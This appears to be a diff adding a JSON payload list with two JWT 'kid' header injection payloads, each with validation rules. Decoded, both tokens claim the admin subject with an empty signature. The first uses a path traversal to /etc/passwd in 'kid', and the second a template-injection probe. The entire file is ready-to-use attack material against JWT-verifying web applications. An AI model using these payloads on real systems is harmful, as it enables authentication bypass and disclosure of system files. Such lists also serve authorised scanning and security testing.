@@ -1,0 +1,24 @@
+[
+  {
+    "payload_id": "OWP-66935",
+    "vulnerability_category": "Cryptographic Failures (JWT Kid Injection)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii8uLi8uLi8uLi9ldGMvcGFzc3dkIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|eyJ"
+    }
+  },
+  {
+    "payload_id": "OWP-66936",
+    "vulnerability_category": "Cryptographic Failures (JWT Kid Injection)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IiR7Nyo3fSJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|eyJ"
+    }
+  }
+]
